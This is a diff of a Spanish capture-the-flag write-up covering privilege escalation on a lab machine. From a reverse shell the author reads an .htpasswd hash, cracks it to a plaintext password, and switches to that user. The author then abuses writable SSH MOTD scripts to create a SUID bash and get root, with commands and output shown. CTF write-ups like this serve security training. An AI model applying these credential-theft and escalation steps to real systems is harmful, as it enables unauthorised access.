@@ -222,10 +222,10 @@ Enunciado :
 
 - En el directorio /html, que es el directorio en el que obtenemos la reverse shell vemos un fichero .htpasswd (fichero que almacena credenciales de usuarios para una autenticación de acceso básica en un servidor HTTP Apache.)
 
-  El fichero contiene una credencial para el usuario james.
-
-      www-data@osboxes:/var/www/html$ cat .htpasswd 
-      james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
+    El fichero contiene una credencial para el usuario james.
+  
+        www-data@osboxes:/var/www/html$ cat .htpasswd 
+        james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
 
 - Vamos a ver los posibles usuarios del sistema, como podemos ver james es un usuario del sistema.
 
@@ -233,25 +233,76 @@ Enunciado :
       root:x:0:0:root:/root:/bin/bash
       james:x:1001:1001::/home/james:/bin/bash
 
--Identificamos el tipo de hash que htpasswd utiliza para la clave.
+- Identificamos el tipo de hash que htpasswd utiliza para la clave.
 
   ![image](https://github.com/Esevka/CTF/assets/139042999/4cd2489c-1a4a-4d29-b9b9-65c0b4f442be)
 
-  Intentamos crakear la clave.
+    Intentamos crakear la clave.
+  
+    ![image](https://github.com/Esevka/CTF/assets/139042999/d61410a7-ea7f-43b4-9195-975cb4521c97)
+    ![image](https://github.com/Esevka/CTF/assets/139042999/0e35d1d0-843c-4b5c-8796-e4d6b5fff286)
+  
+      Credenciales ---> james:jamaica
 
-  ![image](https://github.com/Esevka/CTF/assets/139042999/d61410a7-ea7f-43b4-9195-975cb4521c97)
-  ![image](https://github.com/Esevka/CTF/assets/139042999/0e35d1d0-843c-4b5c-8796-e4d6b5fff286)
-
-    Credenciales ---> james:jamaica
-
-
-
+- Escalada horizontal, vemos si las credenciales son validas para loguearnos como el usuario james.
+  
+      www-data@osboxes:/var/www/html$ su james
+      Password:                                                                                                            
+      james@osboxes:/var/www/html$   -----------> BINGO <--------------
       
+  Obtenemos la flag user.txt
 
-      
+      james@osboxes:~$ cat user.txt 
+      7e37c84a66c$$$$$$$$$$$$700d08d28c20
 
+- En el directorio del usuario james junto a la flag encontramos esta nota.
+
+  Dice que tenemos permisos de edicion sobre los ficheros que configuran el mensaje de bienvenida del servicio ssh.
     
-        
+  ![image](https://github.com/Esevka/CTF/assets/139042999/ecc4ac8f-23d0-489f-babc-1c84764d848b)
+
+  - Editamos el mensaje de bienvenida para realizar una escalada hacia root.
+  
+    INFO ---> Motd(Message Of The Day) servicio SSH: https://linuxconfig.org/how-to-change-welcome-message-motd-on-ubuntu-18-04-server
+
+    Como vemos tenemos todos los permisos sobre los ficheros de configuracion.
+    
+        james@osboxes:/etc/update-motd.d$ ls -lat
+        total 44
+        drwxr-xr-x 134 root root  12288 Mar 10  2021 ..
+        drwxr-xr-x   2 root root   4096 Mar 10  2021 .
+        -rwxrwxr-x   1 root james     0 Mar 10  2021 00-header.save
+        -rwxrwxr-x   1 root james  1220 Mar 10  2021 00-header
+        -rwxrwxr-x   1 root james    97 Dec  7  2018 90-updates-available
+        -rwxrwxr-x   1 root james   142 Dec  7  2018 98-fsck-at-reboot
+        -rwxrwxr-x   1 root james   144 Dec  7  2018 98-reboot-required
+        -rwxrwxr-x   1 root james   604 Nov  5  2017 99-esm
+        -rwxrwxr-x   1 root james   299 Jul 22  2016 91-release-upgrade
+        -rwxrwxr-x   1 root james  1157 Jun 14  2016 10-help-text
+
+    Editamos el fichero 00-header.save
+
+    ![image](https://github.com/Esevka/CTF/assets/139042999/583e318c-7463-4671-b067-5f9fd033021f)
+
+    Nos conectamos por el servicio SSH para que muestre el mensaje de bienvenida y a su vez se ejecuten los comandos anteriores.
+    Como podemos ver nos ha creado nuestra bash con el SUID activo y los permisos perfectamente.
+
+    ![image](https://github.com/Esevka/CTF/assets/139042999/5166e170-325b-43ea-b1ae-1051728fed98)
+
+    Para finalizar ejecutamos la bash con la flag -p ()
+
+        james@osboxes:~$ /tmp/esevka -p
+    
+        esevka-4.3# whoami
+        root
+    
+        esevka-4.3# cd /root
+    
+        esevka-4.3# ls
+        root.txt
+    
+        esevka-4.3# cat root.txt 
+        3c8c3d0fe$$$$$$$$$$$8e32f68fabf4b
 
 
 
